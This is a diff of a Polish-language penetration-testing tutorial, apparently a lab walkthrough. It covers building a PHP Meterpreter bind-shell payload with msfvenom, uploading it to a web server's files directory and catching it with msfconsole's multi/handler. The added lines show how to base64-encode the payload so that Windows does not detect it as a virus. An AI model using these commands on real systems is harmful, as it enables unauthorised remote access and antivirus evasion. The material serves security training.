@@ -107,8 +107,13 @@ root@kali:~# msfvenom -p php/meterpreter/bind_tcp LPORT=5555 > php_meterpreter_b
 No encoder specified, outputting raw payload
 Payload size: 1338 bytes
 ```
+Jeżeli nam windows wykryje, że ten ładunek to wirus, to należy go zaciemnić i potem wyedytować plik: na początku dodać **<?php**, na końcu **?>**
+{: .text-justify}
+{: .notice--danger}
+```bash
+root@kali:~# msfvenom -e php/base64 -p php/meterpreter/bind_tcp LPORT=5555 > php_meterpreter_bind_tcp.php
+```
 Do katalogu **files** wrzucamy **php_meterpreter_bind_tcp.php**, ale zanim odświeżymy i uruchomimy na stronie, to załadujmy nasz ładunek i exploita w Msfconsole:
-
 ```bash
 msf6 > use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
